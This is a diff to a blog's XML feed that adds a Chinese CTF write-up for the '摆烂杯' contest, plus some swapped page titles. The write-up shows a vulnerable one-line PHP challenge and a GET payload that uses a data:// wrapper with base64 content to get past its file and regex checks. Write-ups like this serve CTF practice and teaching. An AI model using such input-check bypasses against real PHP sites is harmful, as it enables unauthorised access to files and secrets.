@@ -4,6 +4,37 @@
   
   
   <entry>
+    <title>摆烂杯</title>
+    <link href="/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/"/>
+    <url>/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/</url>
+    
+    <content type="html"><![CDATA[<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271752482.png"></p><p>输入后会将算式式输出</p><p><code>(1)**3+(1)**3+(1)**3=3</code></p><p>不能有0</p><p>构造<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271755579.png"><br>提交得到flag</p><h2 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ctfsho"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token single-quoted-string string">'w'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token double-quoted-string string">"welcome2ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>需要各个表达式都为false才能得到flag</p><p>payload：<code>?id=a&amp;filename=data://text/plain;base64,d2VsY29tZTJjdGZzaG93t&amp;content=Wdasdasfas</code></p><p><a href="https://qgieod1s9b.feishu.cn/docs/doccnC4EpMhSv1Ni6mbL7BQQdBc#">摆烂杯WP</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>wp</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>摆烂杯</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>金盾杯2021</title>
     <link href="/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/"/>
     <url>/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/</url>
@@ -3025,7 +3056,7 @@
   
   
   <entry>
-    <title>关于</title>
+    <title>About</title>
     <link href="/"/>
     <url>/</url>
     
@@ -3036,7 +3067,7 @@
   
   
   <entry>
-    <title>About</title>
+    <title>关于</title>
     <link href="/"/>
     <url>/</url>
     
@@ -3080,7 +3111,7 @@
   
   
   <entry>
-    <title>Html</title>
+    <title>Friends</title>
     <link href="/"/>
     <url>/</url>
     
@@ -3113,7 +3144,7 @@
   
   
   <entry>
-    <title>Friends</title>
+    <title>Html</title>
     <link href="/"/>
     <url>/</url>
     
